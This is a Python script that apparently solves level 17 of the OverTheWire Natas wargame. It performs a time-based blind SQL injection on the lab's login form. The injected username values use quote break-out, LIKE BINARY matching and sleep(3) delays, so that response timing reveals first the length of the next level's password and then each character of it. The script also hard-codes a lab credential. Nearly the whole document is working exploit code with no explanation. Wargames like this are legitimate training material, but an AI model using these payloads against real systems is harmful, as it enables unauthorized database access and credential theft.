import requests
from requests.auth import HTTPBasicAuth

url="http://natas17.natas.labs.overthewire.org"

charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

passwd=""

l=1
while True:
	d={'username':'natas18" AND length(password)="'+str(l)+'" and sleep(3) -- '}
	r=requests.post(url,data=d,auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
	if(r.elapsed.seconds >= 1):
		break
	l+=1

print "Size of password is: ",l

for i in range(0,l):
	for c in charset:
		d={'username':'natas18" AND password LIKE BINARY "'+passwd+c+'%" and sleep(3) -- '}
		r=requests.post(url,data=d,auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
		if(r.elapsed.seconds >= 1):
			passwd=passwd+c
			print passwd
			break
	



